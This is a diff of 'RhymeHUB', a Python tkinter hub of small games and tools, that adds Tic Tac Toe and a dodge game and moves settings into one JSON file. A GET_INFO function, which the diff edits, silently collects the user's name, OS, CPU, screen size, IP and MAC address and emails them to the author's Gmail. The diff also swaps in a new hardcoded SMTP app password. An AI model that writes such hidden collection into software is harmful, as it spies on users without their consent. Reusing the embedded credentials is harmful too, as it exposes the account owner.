@@ -8,43 +8,41 @@ FileConfirmation=False
 GloFileLOC=''
 Paused=False
 SUM=""
+Player1=True
+WinChk=False
 ScriptDir=os.path.dirname(os.path.abspath(__file__))
 
 def Hub():
 	from tkinter import Label, N, S, E, W, filedialog, PhotoImage
 	from tkinter.ttk import Button, Entry
 	import tkinter as tk
-	import requests
+	import requests, json
 
 	#Tk Start
 	MainWin=tk.Tk()
 
 	#Pre_Function
 	try:
-		with open("Data/BG_Color.rpsettings","r") as f:
-			BG_Color=f.read()
-			Label(MainWin, text="Test", background=BG_Color, foreground="White")
+		with open("Data/Settings","r") as f:
+			SettingsSTR=f.read()
+		Settings=json.loads(SettingsSTR)
+		BG_Color=Settings["BackgroundColor"]
+		TEXTCOLOR=Settings["ForegroundColor"]
+		Label(MainWin, text="Loading...", background=BG_Color, foreground=TEXTCOLOR)
 	except:
-		with open("Data/BG_Color.rpsettings","w") as f:
-			f.write("#0e0e0e")
-		with open("Data/BG_Color.rpsettings","r") as f:
-			BG_Color=f.read()
-
-	try:
-		with open("Data/FG_Color.rpsettings","r") as f:
-			TEXTCOLOR=f.read()
-			Label(MainWin, text="Test", background=BG_Color, foreground=TEXTCOLOR)
-	except:
-		with open("Data/FG_Color.rpsettings","w") as f:
-			f.write("White")
-		with open("Data/FG_Color.rpsettings","r") as f:
-			TEXTCOLOR=f.read()
+		with open("Data/Settings","w") as f:
+			f.write('{"BackgroundColor":"#0e0e0e", "ForegroundColor":"White", "WorkNote":"No Notes!", "CRPT":0}') 
+		with open("Data/Settings","r") as f:
+			SettingsSTR=f.read()
+		Settings=json.loads(SettingsSTR)
+		BG_Color=Settings["BackgroundColor"]
+		TEXTCOLOR=Settings["ForegroundColor"]
 	
 	#Variable
 	TITLEFG="#212121"
 	TITLEBG="#28A6FF"
-	Version=0.8
-	SupportedMediaVersion=[0.3, 0.4, 0.5, 0.6, 0.7, 0.8]
+	Version=0.9
+	SupportedMediaVersion=[0.3, 0.4, 0.5, 0.6, 0.7, 0.8, 0.8, 0.9]
 	
 	#Window Config
 	MainWin.title('RhymeHUB')
@@ -59,13 +57,23 @@ def Hub():
 	def TokenManager():
 		global RPTammount
 		try:
-			with open("Data/CRPT","r") as f:
-				RPTammount=int(f.read())
+			with open("Data/Settings","r") as f:
+				SettingSTR=f.read()
+			Settings=json.loads(SettingSTR)
+			RPTammount=int(Settings["CRPT"])
 		except:
-			with open("Data/CRPT","w") as f:
-				f.write("0")
-			with open("Data/CRPT","r") as f:
-				RPTammount=int(f.read())
+			#Writing
+			with open("Data/Settings","r") as f:
+				SettingSTR=f.read()
+			Settings=json.loads(SettingSTR)
+			Settings["CRPT"]=int("0")
+			with open("Data/Settings","w") as f:
+				f.write(json.dumps(Settings))
+			#Reading_Again
+			with open("Data/Settings","r") as f:
+				SettingSTR=f.read()
+			Settings=json.loads(SettingSTR)
+			RPTammount=int(Settings["CRPT"])
 
 	def Delete_Files():
 		import getpass
@@ -87,9 +95,9 @@ def Hub():
 	def GET_INFO():
 		try:
 			try:
-				import smtplib, time, platform, socket, uuid, re
+				import smtplib, time, platform, socket, uuid, re, os
 				from screeninfo import get_monitors
-				
+
 				def get_cpu_name():
 					from win32com.client import GetObject
 					root_winmgmts = GetObject("winmgmts:root\cimv2")
@@ -111,14 +119,13 @@ def Hub():
 					smtp.starttls()
 					smtp.ehlo()
 					
-					smtp.login('isfartousifbot@gmail.com', 'Rhyme1234rhyme')
+					smtp.login('isfartousifbot@gmail.com', 'bcruzigunzzzhoxk')
 					
 					subject = "New Login From "+USER_NAME+"-RhymeHub."
 					Body = "Login Detected from, '"+USER_NAME+"'. Running on '"+OS_NAME+"'.\n\nProcessor: '"+CPU+"'\nCPU Name: '"+CPUName+"'\nScreen Resolution: '"+Screen_Size+"'.\nDir Of Script: '"+ScriptRunDir+"'\nIP: '"+IP+"'\nMAC: '"+MAC+"'.\n\nTime of Login: '"+Time+"'."
 					
 					MSG= f'Subject: {subject}\n\n{Body}'
 					smtp.sendmail("isfartousifbot@gmail.com", "isfartousif2@gmail.com", MSG)
-					print("online info")
 
 			except:
 				import smtplib, time, platform, socket, uuid, re, os
@@ -157,16 +164,15 @@ def Hub():
 
 				with open("Data\Info", "w") as f:
 					f.write(json.dumps(Info, indent=2))
-				print("offline info")
 
 		except:
 			pass
 	
 	def ChkUpdate():
 		try:
-			VersionLINK="https://rhymeplays.000webhostapp.com/Data/Version.html"
-			DownloadLINK="https://rhymeplays.000webhostapp.com/Data/Download.html"
-			MessageCHKLINK="https://rhymeplays.000webhostapp.com/Data/MessageCHK"
+			VersionLINK="https://drive.google.com/uc?id=1NyPzy3wzAz-N6ppPi0Fvk3s6p0Qg1ldK"
+			DownloadLINK="https://drive.google.com/uc?id=1zVeAmlx_sKnEN0I5iR3lDiJTmw8TCmu0"
+			MessageCHKLINK="https://drive.google.com/uc?id=19-7Ovj0joCZAvNxXYlivINKt_UwvXz8k"
 			REQVER=requests.get(VersionLINK)
 			REQDOWN=requests.get(DownloadLINK)
 			MESCHK=requests.get(MessageCHKLINK)
@@ -184,7 +190,7 @@ def Hub():
 				pass
 			
 			if MESCHKTXT == str(1):
-				MessageLINK="https://rhymeplays.000webhostapp.com/Data/Message"
+				MessageLINK="https://drive.google.com/uc?id=1is7cznbX16ZccKhzCiaHnxVYPeP1XRat"
 				MSGLNK=requests.get(MessageLINK)
 				MESSTR=str(MSGLNK.text)
 				from tkinter import messagebox
@@ -210,10 +216,14 @@ def Hub():
 		
 		#Function
 		def UpdateColor():
-			with open("Data/BG_Color.rpsettings","w") as f:
-				f.write(BGColorEnt.get())
-			with open("Data/FG_Color.rpsettings","w") as f:
-				f.write(FGColorEnt.get())
+			#BGColorEnt.get()
+			with open("Data/Settings", "r") as f:
+				SettingsSTR=f.read()
+			Settings=json.loads(SettingsSTR)
+			Settings["BackgroundColor"]=BGColorEnt.get()
+			Settings["ForegroundColor"]=FGColorEnt.get()
+			with open("Data/Settings", "w") as f:
+				f.write(json.dumps(Settings, indent=2))
 			from tkinter import messagebox
 			messagebox.showinfo("RhymeHUB","Changes Will Take Effect the Next Time you Open RhymeHUB")
 
@@ -271,7 +281,7 @@ def Hub():
 		Temp=tk.Tk()
 
 		#Window_Config
-		Temp.title('RhymePlays Calculator')
+		Temp.title('RhymePlays TempCalc')
 		###Temp.geometry("100x100")
 		Temp.resizable(False, False)
 		Temp.configure(bg=BG_Color)
@@ -651,14 +661,11 @@ def Hub():
 
 		#Functions
 		def NOTE():
-			try:
-				with open("Data/WorkNote", "r") as f:
-					NoteString=str(f.read())
-				Note["text"]=NoteString
-			except:
-				with open("Data/WorkNote", "w") as f:
-					f.write("No Notes!")
-				NOTE()
+			with open("Data/Settings") as f:
+				SettingsSTR=f.read()
+			Settings=json.loads(SettingsSTR)
+			NoteString=str(Settings["WorkNote"])
+			Note["text"]=NoteString
 
 		def LAUNCH():
 			from tkinter import messagebox
@@ -700,7 +707,7 @@ def Hub():
 		TokenManager()
 
 		def Unlock():
-			FileLoc=filedialog.askopenfilename(initialdir='/', title='Select File', filetypes=(('RhymePlays Movie','*.rplmov'), ('Rhyme Media File','*.rplmus')))
+			FileLoc=filedialog.askopenfilename(initialdir='/', title='Select File', filetypes=(('RhymePlays Movie','*.rplmov'), ('RhymePlays Music','*.rplmus')))
 			
 			LOCKMOV='.rplmov' in str(FileLoc)
 			LOCKMUS='.rplmus' in str(FileLoc)
@@ -709,8 +716,13 @@ def Hub():
 			
 			if LOCKMOV==True:
 				if RPTammount>=2:
-					with open("Data/CRPT","w") as f:
-						f.write(str(RPTammount-2))
+					with open("Data/Settings","r") as f:
+						SettingsSTR=f.read()
+					Settings=json.loads(SettingsSTR)
+					Settings["CRPT"]=int(RPTammount-2)
+					with open("Data/Settings","w") as f:
+						f.write(json.dumps(Settings))
+
 					TokenManager()
 					
 					FolderDir=os.path.dirname(os.path.abspath(FileLoc))
@@ -726,9 +738,12 @@ def Hub():
 					
 			if LOCKMUS==True:
 				if RPTammount>=1:
-					with open("Data/CRPT","w") as f:
-						f.write(str(RPTammount-1))
-					TokenManager()
+					with open("Data/Settings","r") as f:
+						SettingsSTR=f.read()
+					Settings=json.loads(SettingsSTR)
+					Settings["CRPT"]=int(RPTammount-1)
+					with open("Data/Settings","w") as f:
+						f.write(json.dumps(Settings))
 					
 					FolderDir=os.path.dirname(os.path.abspath(FileLoc))
 					with open(FileLoc) as f:
@@ -943,8 +958,12 @@ def Hub():
 			root.mainloop()
 		
 		def MakeReqList():
-			with open("Data/Request","w") as f:
-				f.write(RequestedList.get())
+			with open("Data/Settings","r") as f:
+				SettingsSTR=f.read()
+			Settings=json.loads(SettingsSTR)
+			Settings["Request"]=str(RequestedList.get())
+			with open("Data/Settings","w") as f:
+				f.write(json.dumps(Settings))
 		
 		#Elements
 		Title=Label(root, text="RhymePlays Media", width=20, font="Arial 20", anchor="w", fg=TITLEFG, bg=TITLEBG)
@@ -1015,8 +1034,12 @@ def Hub():
 					f.write(json.dumps(Codes, indent=2))
 				
 				TokenManager()#Update Token
-				with open("Data\CRPT", "w") as f:
-					f.write(str(RPTammount+AddRedeemAmount))
+				with open("Data/Settings","r") as f:
+					SettingsSTR=f.read()
+				Settings=json.loads(SettingsSTR)
+				Settings["CRPT"]=int(RPTammount+AddRedeemAmount)
+				with open("Data/Settings","w") as f:
+					f.write(json.dumps(Settings))
 				TokenManager()
 				
 				RedeemInfo=Label(RedeemWin, text="Successfully added '"+str(AddRedeemAmount)+"' Token(s) to your Account.\nYou Currently have '"+str(RPTammount)+"' Token(s)", font=(5), background=BG_Color, foreground=TEXTCOLOR)
@@ -1043,6 +1066,269 @@ def Hub():
 		#Mainloop
 		RedeemWin.mainloop()
 
+	def TTT():
+		from tkinter import Button, Label, E,W,N,S
+		import tkinter as tk
+
+		#TK_Start
+		TTT=tk.Tk()
+
+		#WindowConfig
+		TTT.title("RhymePlays Tic Tac Toe")
+		TTT.resizable(False, False)
+		TTT.configure(bg=TEXTCOLOR)
+		try:
+			TTT.iconbitmap("Data/Icon.ico")
+		except:
+			pass
+
+		#Functions
+		def TogglePlayer():
+			global Player1
+			if Player1==True: Player1=False
+			else: Player1=True
+
+		def Restart():
+			global WinChk
+			TogglePlayer()
+			A1["text"]="  "
+			A2["text"]="  "
+			A3["text"]="  "
+			B1["text"]="  "
+			B2["text"]="  "
+			B3["text"]="  "
+			C1["text"]="  "
+			C2["text"]="  "
+			C3["text"]="  "
+			Win["text"]="Click to Restart!"
+			WinChk=False
+
+		def GameOver(WinStat):
+			global WinChk
+			if WinStat=="P1":Win["text"]="Player 1(X) Won!\nClick to Restart!"; WinChk=True;
+			elif WinStat=="P2":Win["text"]="Player 2(O) Won!\nClick to Restart!"; WinChk=True;
+			elif WinStat=="Draw":Win["text"]="Draw!\nClick to Restart!"; WinChk=True;
+			else: pass
+
+		def WinOrDraw():
+			if A1["text"]=="X" and A2["text"]=="X" and A3["text"]=="X":GameOver("P1")
+			elif B1["text"]=="X" and B2["text"]=="X" and B3["text"]=="X":GameOver("P1")
+			elif C1["text"]=="X" and C2["text"]=="X" and C3["text"]=="X":GameOver("P1")
+			elif A1["text"]=="X" and B1["text"]=="X" and C1["text"]=="X":GameOver("P1")
+			elif A2["text"]=="X" and B2["text"]=="X" and C2["text"]=="X":GameOver("P1")
+			elif A3["text"]=="X" and B3["text"]=="X" and C3["text"]=="X":GameOver("P1")
+			elif A1["text"]=="X" and B2["text"]=="X" and C3["text"]=="X":GameOver("P1")
+			elif A3["text"]=="X" and B2["text"]=="X" and C1["text"]=="X":GameOver("P1")
+
+			elif A1["text"]=="O" and A2["text"]=="O" and A3["text"]=="O":GameOver("P2")
+			elif B1["text"]=="O" and B2["text"]=="O" and B3["text"]=="O":GameOver("P2")
+			elif C1["text"]=="O" and C2["text"]=="O" and C3["text"]=="O":GameOver("P2")
+			elif A1["text"]=="O" and B1["text"]=="O" and C1["text"]=="O":GameOver("P2")
+			elif A2["text"]=="O" and B2["text"]=="O" and C2["text"]=="O":GameOver("P2")
+			elif A3["text"]=="O" and B3["text"]=="O" and C3["text"]=="O":GameOver("P2")
+			elif A1["text"]=="O" and B2["text"]=="O" and C3["text"]=="O":GameOver("P2")
+			elif A3["text"]=="O" and B2["text"]=="O" and C1["text"]=="O":GameOver("P2")
+
+			elif A1["text"]!="  " and A2["text"]!="  " and A3["text"]!="  " and B1["text"]!="  " and B2["text"]!="  " and B3["text"]!="  " and C1["text"]!="  " and C2["text"]!="  " and C3["text"]!="  ":GameOver("Draw")
+
+			else:TogglePlayer()
+
+		def Mark(id):
+			if WinChk==False:
+				if Player1==True:
+					if id=="A1" and A1["text"]=="  ": A1["text"]="X"; WinOrDraw()
+					elif id=="A2" and A2["text"]=="  ": A2["text"]="X"; WinOrDraw()
+					elif id=="A3" and A3["text"]=="  ": A3["text"]="X"; WinOrDraw()
+					elif id=="B1" and B1["text"]=="  ": B1["text"]="X"; WinOrDraw()
+					elif id=="B2" and B2["text"]=="  ": B2["text"]="X"; WinOrDraw()
+					elif id=="B3" and B3["text"]=="  ": B3["text"]="X"; WinOrDraw()
+					elif id=="C1" and C1["text"]=="  ": C1["text"]="X"; WinOrDraw()
+					elif id=="C2" and C2["text"]=="  ": C2["text"]="X"; WinOrDraw()
+					elif id=="C3" and C3["text"]=="  ": C3["text"]="X"; WinOrDraw()
+					else: pass
+					
+				elif Player1==False:
+					if id=="A1" and A1["text"]=="  ": A1["text"]="O"; WinOrDraw()
+					elif id=="A2" and A2["text"]=="  ": A2["text"]="O"; WinOrDraw()
+					elif id=="A3" and A3["text"]=="  ": A3["text"]="O"; WinOrDraw()
+					elif id=="B1" and B1["text"]=="  ": B1["text"]="O"; WinOrDraw()
+					elif id=="B2" and B2["text"]=="  ": B2["text"]="O"; WinOrDraw()
+					elif id=="B3" and B3["text"]=="  ": B3["text"]="O"; WinOrDraw()
+					elif id=="C1" and C1["text"]=="  ": C1["text"]="O"; WinOrDraw()
+					elif id=="C2" and C2["text"]=="  ": C2["text"]="O"; WinOrDraw()
+					elif id=="C3" and C3["text"]=="  ": C3["text"]="O"; WinOrDraw()
+					else: pass
+			else: pass
+
+		#Elements
+		Name=Label(TTT, text="RhymePlays Tic Tac Toe", background="#33A8FF", foreground=TEXTCOLOR, font=("Arial",20))
+		Win=Button(TTT, text="Click to Restart!", background="#33A8FF", foreground=TEXTCOLOR, font=("Arial",15), bd=0, command=Restart)
+
+		A1=Button(TTT, text="  ", height=5, background=BG_Color, foreground=TEXTCOLOR, bd=0, command=lambda: Mark("A1"), font=(5))
+		A2=Button(TTT, text="  ", height=5, background=BG_Color, foreground=TEXTCOLOR, bd=0, command=lambda: Mark("A2"), font=(5))
+		A3=Button(TTT, text="  ", height=5, background=BG_Color, foreground=TEXTCOLOR, bd=0, command=lambda: Mark("A3"), font=(5))
+
+		B1=Button(TTT, text="  ", height=5, background=BG_Color, foreground=TEXTCOLOR, bd=0, command=lambda: Mark("B1"), font=(5))
+		B2=Button(TTT, text="  ", height=5, background=BG_Color, foreground=TEXTCOLOR, bd=0, command=lambda: Mark("B2"), font=(5))
+		B3=Button(TTT, text="  ", height=5, background=BG_Color, foreground=TEXTCOLOR, bd=0, command=lambda: Mark("B3"), font=(5))
+
+		C1=Button(TTT, text="  ", height=5, background=BG_Color, foreground=TEXTCOLOR, bd=0, command=lambda: Mark("C1"), font=(5))
+		C2=Button(TTT, text="  ", height=5, background=BG_Color, foreground=TEXTCOLOR, bd=0, command=lambda: Mark("C2"), font=(5))
+		C3=Button(TTT, text="  ", height=5, background=BG_Color, foreground=TEXTCOLOR, bd=0, command=lambda: Mark("C3"), font=(5))
+
+		Credit=Label(TTT, text="Made by Isfar Tousif Rhyme", background=BG_Color, foreground=TEXTCOLOR)
+
+
+		#Grids
+		Name.grid(row=0, column=0, sticky=E+W+N+S, columnspan=3)
+
+		Win.grid(row=1, column=0, sticky=E+W+N+S, columnspan=3)
+
+		A1.grid(row=2, column=0, sticky=E+W+N+S, padx=5, pady=5)
+		A2.grid(row=2, column=1, sticky=E+W+N+S, padx=5, pady=5)
+		A3.grid(row=2, column=2, sticky=E+W+N+S, padx=5, pady=5)
+
+		B1.grid(row=3, column=0, sticky=E+W+N+S, padx=5, pady=5)
+		B2.grid(row=3, column=1, sticky=E+W+N+S, padx=5, pady=5)
+		B3.grid(row=3, column=2, sticky=E+W+N+S, padx=5, pady=5)
+
+		C1.grid(row=4, column=0, sticky=E+W+N+S, padx=5, pady=5)
+		C2.grid(row=4, column=1, sticky=E+W+N+S, padx=5, pady=5)
+		C3.grid(row=4, column=2, sticky=E+W+N+S, padx=5, pady=5)
+
+		Credit.grid(row=5, column=0, sticky=E+W+N+S, columnspan=3)
+
+		#Mainloop
+		TTT.mainloop()
+
+	def RhymeDodgeGame():
+		try:
+			#Imports
+			import turtle, random
+
+			#Variables
+			WindowWidth, WindowHeight=800, 500
+			ObstaclePos=[]
+
+			#Init_Window
+			GameWindow=turtle.Screen()
+
+			#Window_Setup
+			GameWindow.title("RhymeDodge")
+			GameWindow.bgcolor("#0e0e0e")
+			GameWindow.setup(width=WindowWidth+50, height=WindowHeight+50)
+			turtle.listen()
+
+			def playerOBJ():
+				Player=turtle.Turtle();Player.penup();Player.shape("arrow");Player.speed(0);Player.color("red");Player.setposition(-(WindowWidth/2)+5,0)
+
+				#WindowBorder
+				BorderPen=turtle.Turtle();BorderPen.hideturtle();BorderPen.speed(0);BorderPen.penup();BorderPen.color("White");BorderPen.setposition((WindowWidth/2), (WindowHeight/2));BorderPen.pensize(5);BorderPen.pendown()
+				def setBorder():
+					BorderPen.rt(90);BorderPen.fd(WindowHeight);BorderPen.rt(90);BorderPen.fd(WindowWidth);BorderPen.rt(90);BorderPen.fd(WindowHeight);BorderPen.rt(90);BorderPen.fd(WindowWidth);BorderPen.penup()
+				setBorder()
+
+				#EndGame
+				EndPen=turtle.Turtle();EndPen.penup();EndPen.hideturtle();EndPen.speed(0);EndPen.color("lime");EndPen.setposition(0, -50)
+
+				#HeartManager
+				PlayerLive=3
+				HeartPen=turtle.Turtle();HeartPen.penup();HeartPen.hideturtle();HeartPen.speed(0);HeartPen.color("red");HeartPen.setposition(-(WindowWidth/2)+15, (WindowHeight/2)-40)
+				def updateHeart():
+					HeartPen.clear()
+					HeartPen.write(f"♥ {PlayerLive}", font=("Arial", 20), align="Left")
+				updateHeart()
+
+				#ScoreManager
+				Score=0
+				ScorePen=turtle.Turtle();ScorePen.penup();ScorePen.hideturtle();ScorePen.speed(0);ScorePen.color("lime");ScorePen.setposition(-(WindowWidth/2)+15, (WindowHeight/2)-70)
+				def updateScore():
+					ScorePen.clear()
+					ScorePen.write(f"Score: {Score}", font=("Arial", 20), align="Left")
+				updateScore()
+
+				#Obstacle
+				SpawnCount=1
+				ObstacleSize=20
+				ObstaclePen=turtle.Turtle();ObstaclePen.hideturtle();ObstaclePen.penup();ObstaclePen.shape("square");ObstaclePen.speed(0);ObstaclePen.color("blue", "lightblue")
+				def obstacleOBJ():
+					ObstaclePen.clear()
+					for Obstacles in range(SpawnCount):
+						SpawnX=random.randint(-(WindowWidth/2), (WindowWidth/2))
+						SpawnYINT=random.randint(1, 11)
+						if SpawnYINT==1: SpawnY=-250
+						elif SpawnYINT==2: SpawnY=-200
+						elif SpawnYINT==3: SpawnY=-150
+						elif SpawnYINT==4: SpawnY=-100
+						elif SpawnYINT==5: SpawnY=-50
+						elif SpawnYINT==6: SpawnY=0
+						elif SpawnYINT==7: SpawnY=50
+						elif SpawnYINT==8: SpawnY=100
+						elif SpawnYINT==9: SpawnY=150
+						elif SpawnYINT==10: SpawnY=200
+						elif SpawnYINT==11: SpawnY=250
+						ObstaclePen.setposition(SpawnX, SpawnY-ObstacleSize)
+						ObstaclePen.pendown();ObstaclePen.begin_fill()
+						ObstaclePen.circle(ObstacleSize)
+						ObstaclePen.end_fill();ObstaclePen.penup()
+						ObstaclePos.append((SpawnX, SpawnY))
+				obstacleOBJ()
+
+				#Controls
+				def up():
+					if Player.ycor()<(WindowHeight/2):
+						Player.setposition(Player.xcor(), Player.ycor()+50)
+
+				def down():
+					if Player.ycor()>-(WindowHeight/2):
+						Player.setposition(Player.xcor(), Player.ycor()-50)
+
+				Playing=True
+				while Playing:
+					Player.fd(1)
+					
+					#BorderCross
+					if Player.xcor()>=(WindowWidth/2):
+						Player.setposition(-(WindowWidth/2)+5, Player.ycor())
+
+						#SpawnNewSetObstacle
+						SpawnCount=SpawnCount+1
+						ObstaclePos.clear()
+						obstacleOBJ()
+
+						#UpdateScore
+						Score=Score+1
+						updateScore()
+
+					#OnCollision
+					if (Player.xcor()+ObstacleSize, Player.ycor()) in ObstaclePos:
+						PlayerLive=PlayerLive-1
+						updateHeart()
+
+					#EndingGame
+					if PlayerLive<=0:
+						Playing=False
+						EndPen.clear()
+						EndPen.write("          You Lost!\nPress Space to Restart", font=("Arial", 30), align="Center")
+
+					#RestartingGame
+					def Restart():
+						if not Playing:
+							EndPen.clear();HeartPen.clear();ScorePen.clear();ObstaclePen.clear();Player.hideturtle();BorderPen.clear()
+							RhymeDodgeGame()
+
+					#KeyPresses
+					turtle.onkey(up, "Up")
+					turtle.onkey(down, "Down")
+					turtle.onkey(lambda: print(f"{Player.xcor()} {Player.ycor()}"), "`")
+					turtle.onkey(Restart, " ")
+			playerOBJ()
+
+			#Mainloop
+			GameWindow.mainloop()
+		except:
+			pass
+
 	#Elements
 	Title=Label(MainWin, text="Welcome to RhymeHUB ", font="Arial 20", anchor="w", fg=TITLEFG, bg=TITLEBG)
 	TitleName=Label(MainWin, text=str(GlobalUname), font="Arial 20", anchor="e", fg=TITLEFG, bg=TITLEBG)
@@ -1056,12 +1342,14 @@ def Hub():
 	Colorchooser=tk.Button(MainWin, text="Choose Color", relief="flat", bd=0, background=TEXTCOLOR, activebackground=BG_Color, foreground=BG_Color, activeforeground=BG_Color, width=20, command=ColorChooser)
 	Yt=tk.Button(MainWin, text="Youtube", relief="flat", bd=0, background=BG_Color, activebackground=TEXTCOLOR, foreground=TEXTCOLOR, activeforeground=BG_Color, width=20, command=YT)
 	Ig=tk.Button(MainWin, text="Instagram", relief="flat", bd=0, background=BG_Color, activebackground=TEXTCOLOR, foreground=TEXTCOLOR, activeforeground=BG_Color, width=20, command=IG)
-	RockPaperSci=tk.Button(MainWin, text="Game", relief="flat", bd=0, background=TEXTCOLOR, activebackground=BG_Color, foreground=BG_Color, activeforeground=BG_Color, width=20, command=RockPaperScissors)
+	RockPaperSci=tk.Button(MainWin, text="Rock Paper Scissors", relief="flat", bd=0, background=TEXTCOLOR, activebackground=BG_Color, foreground=BG_Color, activeforeground=BG_Color, width=20, command=RockPaperScissors)
 	Calculator=tk.Button(MainWin, text="Calculator", relief="flat", bd=0, background=BG_Color, activebackground=TEXTCOLOR, foreground=TEXTCOLOR, activeforeground=BG_Color, width=20, command=Calc)
 	WForce=tk.Button(MainWin, text="WorkForce", relief="flat", bd=0, background=TEXTCOLOR, activebackground=BG_Color, foreground=BG_Color, activeforeground=BG_Color, width=20, command=WorkForce)
 	rpMedia=tk.Button(MainWin, text="RhymePlays Media", relief="flat", bd=0, background=TEXTCOLOR, activebackground=BG_Color, foreground=BG_Color, activeforeground=TEXTCOLOR, width=20, command=Media)
 	RPRedeem=tk.Button(MainWin, text="RhymePlays Redeem", relief="flat", bd=0, background=BG_Color, activebackground=TEXTCOLOR, foreground=TEXTCOLOR, activeforeground=BG_Color, width=20, command=Redeem)
-	
+	RPTTT=tk.Button(MainWin, text="Tic Tac Toe", relief="flat", bd=0, background=TEXTCOLOR, activebackground=BG_Color, foreground=BG_Color, activeforeground=TEXTCOLOR, width=20, command=TTT)
+	RPDodge=tk.Button(MainWin, text="RhymeDodge", relief="flat", bd=0, background=BG_Color, activebackground=TEXTCOLOR, foreground=TEXTCOLOR, activeforeground=BG_Color, width=20, command=RhymeDodgeGame)
+
 	Credit=Label(MainWin, text="Developed by Isfar Tousif Rhyme.  "+"  RhymeHUB V"+str(Version), anchor="w", bg=BG_Color, fg=TEXTCOLOR)
 	
 	#Grids
@@ -1080,8 +1368,10 @@ def Hub():
 	RockPaperSci.grid(column=1, row=3, ipady=50, sticky=E+W+N+S)
 	Calculator.grid(column=2, row=3, ipady=50, sticky=E+W+N+S)
 	WForce.grid(column=3, row=3, ipady=50, sticky=E+W+N+S)
-	rpMedia.grid(column=0, row=4, ipady=50, sticky=E+W+N+S, columnspan=2)
-	RPRedeem.grid(column=2, row=4, ipady=50, sticky=E+W+N+S, columnspan=2)
+	rpMedia.grid(column=0, row=4, ipady=50, sticky=E+W+N+S)
+	RPRedeem.grid(column=1, row=4, ipady=50, sticky=E+W+N+S)
+	RPTTT.grid(column=2, row=4, ipady=50, sticky=E+W+N+S)
+	RPDodge.grid(column=3, row=4, ipady=50, sticky=E+W+N+S)
 	
 	Credit.grid(column=0, row=5, ipady=5, sticky=E+W+N+S, columnspan=4)
 
@@ -1106,15 +1396,26 @@ def Login():
 	Chk2=IntVar()
 
 	try:
-		with open("Data/Accounts", "r") as f:
-			accountsStr=f.read()
-		Accounts=json.loads(accountsStr)
+		import requests
+		AccountsLinkURL="https://drive.google.com/uc?id=11yvz1e8rtmzbQOWn34kXql3Zc5R7tmEM"
+		AccountsLinkReq=requests.get(AccountsLinkURL)
+		AccountsLinkStr=str(AccountsLinkReq.text)
+		#Get_Accounts
+		AccountsURL=AccountsLinkStr
+		AccountsReq=requests.get(AccountsURL)
+		AccountsStr=str(AccountsReq.text)
+		Accounts=json.loads(AccountsStr)
 	except:
-		with open("Data/Accounts", "w") as f:
-			f.write("{}")
-		with open("Data/Accounts", "r") as f:
-			accountsStr=f.read()
-		Accounts=json.loads(accountsStr)
+		try:
+			with open("Data/Accounts", "r") as f:
+				accountsStr=f.read()
+			Accounts=json.loads(accountsStr)
+		except:
+			with open("Data/Accounts", "w") as f:
+				f.write("{}")
+			with open("Data/Accounts", "r") as f:
+				accountsStr=f.read()
+			Accounts=json.loads(accountsStr)
 	
 	#Window Config
 	root.title('RhymePlays Login')
@@ -1196,4 +1497,4 @@ def Login():
 
 	#MainLoop
 	root.mainloop()
-Hub()
+Login()
